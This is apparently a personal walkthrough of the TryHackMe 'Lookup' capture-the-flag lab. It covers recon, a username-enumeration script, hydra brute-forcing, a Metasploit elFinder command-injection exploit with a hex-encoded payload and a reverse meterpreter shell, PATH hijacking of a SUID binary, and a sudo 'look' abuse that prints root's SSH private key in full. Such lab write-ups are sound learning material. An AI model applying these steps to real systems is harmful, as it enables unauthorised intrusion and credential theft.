@@ -1,0 +1,445 @@
+Lookup -- Tryhackme -- Easy -- 24-Nov-2024 -- 2hr 5min
+
+---- Recon
+
+-- Nmap Scan
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Desktop/TryHackMe/Lookup]
+└─$ nmap -sC -sV -T4 lookup.thm
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-24 05:58 EST
+Nmap scan report for lookup.thm (10.10.69.62)
+Host is up (0.16s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
+|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
+|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Login Page
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.42 seconds
+
+-- Website : 80 
+It has a Login Page
+
+Trying SQL payload , and brute force on user admin
+
+Logic -- If username is wrong -- username or password is wrong
+      -- If password is wrong -- Password is wrong
+      
+Lets use Chatgpt for python script
+
+import requests
+
+# Define the target URL
+url = "http://lookup.thm/login.php"
+
+# Define the file path containing usernames
+file_path = "/usr/share/seclists/Usernames/Names/names.txt"
+
+# Read the file and process each line
+try:
+    with open(file_path, "r") as file:
+        for line in file:
+            username = line.strip()
+            if not username:
+                continue  # Skip empty lines
+            
+            # Prepare the POST data
+            data = {
+                "username": username,
+                "password": "password"  # Fixed password for testing
+            }
+
+            # Send the POST request
+            response = requests.post(url, data=data)
+            
+            # Check the response content
+            if "Wrong password" in response.text:
+                print(f"Username found: {username}")
+            elif "wrong username" in response.text:
+                continue  # Silent continuation for wrong usernames
+except FileNotFoundError:
+    print(f"Error: The file {file_path} does not exist.")
+except requests.RequestException as e:
+    print(f"Error: An HTTP request error occurred: {e}")
+    
+-- Valid username found - admin and jose
+
+Second method - Use Intruder and grep match username 
+-- Found - admin and jose
+
+Brute force username with hydra
+                                                                                                                                                              
+┌──(kali㉿kali)-[~/Desktop/TryHackMe/Lookup]
+└─$ hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong"   
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-24 06:10:25
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:Wrong
+[STATUS] 1115.00 tries/min, 1115 tries in 00:01h, 14343284 to do in 214:24h, 16 active
+[80][http-post-form] host: lookup.thm   login: jose   password: password123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-24 06:11:53
+
+After Login found an online file storage system
+
+Easily find versions elFinder 2.1.47
+
+┌──(kali㉿kali)-[~/Desktop/TryHackMe/Lookup]
+└─$ msfconsole
+Metasploit tip: Use the analyze command to suggest runnable modules for 
+hosts
+                                                  
+     ,           ,
+    /             \
+   ((__---,,,---__))
+      (_) O O (_)_________
+         \ _ /            |\
+          o_o \   M S F   | \
+               \   _____  |  *
+                |||   WW|||
+                |||     |||
+
+
+       =[ metasploit v6.4.18-dev                          ]
++ -- --=[ 2437 exploits - 1255 auxiliary - 429 post       ]
++ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search elfinder
+
+Matching Modules
+================
+
+   #  Name                                                               Disclosure Date  Rank       Check  Description
+   -  ----                                                               ---------------  ----       -----  -----------
+   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
+   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
+   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
+   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
+   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
+
+msf6 > use 4
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set LHOST 10.8.6.012
+LHOST => 10.8.6.012
+msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set LHOST 10.8.6.102
+LHOST => 10.8.6.102
+msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set RHOSTS files.lookup.thm
+RHOSTS => files.lookup.thm
+msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run
+
+[*] Started reverse TCP handler on 10.8.6.102:4444 
+[*] Uploading payload 'FD7am0niD.jpg;echo 6370202e2e2f66696c65732f464437616d306e69442e6a70672a6563686f2a202e625355445277522e706870 |xxd -r -p |sh& #.jpg' (1962 bytes)
+[*] Triggering vulnerability via image rotation ...
+[*] Executing payload (/elFinder/php/.bSUDRwR.php) ...
+[*] Sending stage (39927 bytes) to 10.10.242.156
+[+] Deleted .bSUDRwR.php
+[*] Meterpreter session 1 opened (10.8.6.102:4444 -> 10.10.242.156:47974) at 2024-11-24 07:15:57 -0500
+[*] No reply
+[*] Removing uploaded file ...
+[+] Deleted uploaded file
+
+meterpreter > shell
+Process 1051 created.
+Channel 0 created.
+python -c 'import pty; pty.spawn("/bin/bash")'
+/bin/sh: 1: python: not found
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ cd /home
+cd /home
+www-data@lookup:/home$ ls -l
+ls -l
+total 4
+drwxr-xr-x 5 think think 4096 Jan 11  2024 think
+www-data@lookup:/home$ ls -la
+ls -la
+total 12
+drwxr-xr-x  3 root  root  4096 Jun  2  2023 .
+drwxr-xr-x 19 root  root  4096 Jan 11  2024 ..
+drwxr-xr-x  5 think think 4096 Jan 11  2024 think
+www-data@lookup:/home$ find / -perm /4000 2>/dev/null
+find / -perm /4000 2>/dev/null
+/snap/snapd/19457/usr/lib/snapd/snap-confine
+/snap/core20/1950/usr/bin/chfn
+/snap/core20/1950/usr/bin/chsh
+/snap/core20/1950/usr/bin/gpasswd
+/snap/core20/1950/usr/bin/mount
+/snap/core20/1950/usr/bin/newgrp
+/snap/core20/1950/usr/bin/passwd
+/snap/core20/1950/usr/bin/su
+/snap/core20/1950/usr/bin/sudo
+/snap/core20/1950/usr/bin/umount
+/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1950/usr/lib/openssh/ssh-keysign
+/snap/core20/1974/usr/bin/chfn
+/snap/core20/1974/usr/bin/chsh
+/snap/core20/1974/usr/bin/gpasswd
+/snap/core20/1974/usr/bin/mount
+/snap/core20/1974/usr/bin/newgrp
+/snap/core20/1974/usr/bin/passwd
+/snap/core20/1974/usr/bin/su
+/snap/core20/1974/usr/bin/sudo
+/snap/core20/1974/usr/bin/umount
+/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1974/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/sbin/pwm
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/umount
+www-data@lookup:/home$ ls -la /usr/sbin/pwm
+ls -la /usr/sbin/pwm
+-rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm
+www-data@lookup:/home$ /usr/sbin/pwm
+/usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: www-data
+[-] File /home/www-data/.passwords not found
+www-data@lookup:/home$ export PATH=tmp/:$PATH
+export PATH=tmp/:$PATH
+www-data@lookup:/home$ echo $PATH
+echo $PATH
+tmp/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+www-data@lookup:/home$ cd /tmp
+cd /tmp
+www-data@lookup:/tmp$ echo '#!/bin/bash' > id   
+echo '#!/bin/bash' > id
+www-data@lookup:/tmp$ echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id   
+<0(think) gid=1000(think) groups=1000(think)"' >> id
+www-data@lookup:/tmp$ cat id
+cat id
+#!/bin/bash
+echo "uid=1000(think) gid=1000(think) groups=1000(think)"
+www-data@lookup:/tmp$ /usr/sbin/pwm
+/usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: www-data
+[-] File /home/www-data/.passwords not found
+www-data@lookup:/tmp$ chmod +x id.sh
+chmod +x id.sh
+chmod: cannot access 'id.sh': No such file or directory
+www-data@lookup:/tmp$ chmod +x id
+chmod +x id
+www-data@lookup:/tmp$ ./id
+./id
+uid=1000(think) gid=1000(think) groups=1000(think)
+www-data@lookup:/tmp$ /usr/sbin/pwm
+/usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: www-data
+[-] File /home/www-data/.passwords not found
+www-data@lookup:/tmp$  export PATH=/tmp:$PATH
+ export PATH=/tmp:$PATH
+www-data@lookup:/tmp$ /usr/sbin/pwm
+/usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: think
+jose1006
+jose1004
+jose1002
+jose1001teles
+jose100190
+jose10001
+jose10.asd
+jose10+
+jose0_07
+jose0990
+jose0986$
+jose098130443
+jose0981
+jose0924
+jose0923
+jose0921
+thepassword
+jose(1993)
+jose'sbabygurl
+jose&vane
+jose&takie
+jose&samantha
+jose&pam
+jose&jlo
+jose&jessica
+jose&jessi
+josemario.AKA(think)
+jose.medina.
+jose.mar
+jose.luis.24.oct
+jose.line
+jose.leonardo100
+jose.leas.30
+jose.ivan
+jose.i22
+jose.hm
+jose.hater
+jose.fa
+jose.f
+jose.dont
+jose.d
+jose.com}
+jose.com
+jose.chepe_06
+jose.a91
+jose.a
+jose.96.
+jose.9298
+jose.2856171
+www-data@lookup:/tmp$ 
+
+brute username of think users
+
+┌──(kali㉿kali)-[~/Desktop/TryHackMe/Lookup]
+└─$ hydra -l think -P password.txt ssh://lookup.thm
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-24 07:24:16
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
+[DATA] attacking ssh://lookup.thm:22/
+[22][ssh] host: lookup.thm   login: think   password: josemario.AKA(think)
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-24 07:24:25
+
+We find user flag for root
+
+First i check sudo -l and found an look command run without sudo
+think@lookup:~$ ls
+user.txt
+think@lookup:~$ wc user.txt 
+ 1  1 33 user.txt
+think@lookup:~$ sudo -l
+[sudo] password for think: 
+Matching Defaults entries for think on lookup:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User think may run the following commands on lookup:
+    (ALL) /usr/bin/look
+think@lookup:~$ sudo /usr/bin/look '' /root/ssh/id_rsa
+look: /root/ssh/id_rsa: No such file or directory
+think@lookup:~$ sudo /usr/bin/look '' /root/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+
+Using gtfobins easily exploit root and connect to ssh of root user
+
+                                                                                                                                                               
+┌──(kali㉿kali)-[~/Desktop/TryHackMe/Lookup]
+└─$ ssh -i id_rsa root@lookup.thm
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun 24 Nov 2024 12:27:47 PM UTC
+
+  System load:  0.0               Processes:             138
+  Usage of /:   59.7% of 9.75GB   Users logged in:       1
+  Memory usage: 24%               IPv4 address for ens5: 10.10.242.156
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+7 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon May 13 10:00:24 2024 from 192.168.14.1
+root@lookup:~# ls -la
+total 60K
+drwx------  6 root root 4.0K May 13  2024 .
+drwxr-xr-x 19 root root 4.0K Jan 11  2024 ..
+lrwxrwxrwx  1 root root    9 Jun  2  2023 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3.2K May 12  2024 .bashrc
+drwx------  2 root root 4.0K Jan 11  2024 .cache
+-rwxrwx---  1 root root   66 Jan 11  2024 cleanup.sh
+drwx------  3 root root 4.0K Apr 17  2024 .config
+drwxr-xr-x  3 root root 4.0K Jun 21  2023 .local
+-rw-r--r--  1 root root  161 Jan 11  2024 .profile
+-rw-r-----  1 root root   33 Jan 11  2024 root.txt
+lrwxrwxrwx  1 root root    9 Jul 31  2023 .selected_editor -> /dev/null
+drwx------  2 root root 4.0K Jan 11  2024 .ssh
+-rw-rw-rw-  1 root root  17K May 13  2024 .viminfo
+root@lookup:~# wc root.txt
+ 1  1 33 root.txt
+root@lookup:~# wc -c root.txt 
+33 root.txt 
+
+Mistake - I ask binary exploit to senior becuase writeup is not available -- TOtal mistake is I have to learn binary exploitation
+
+    
+                                                                                                                          
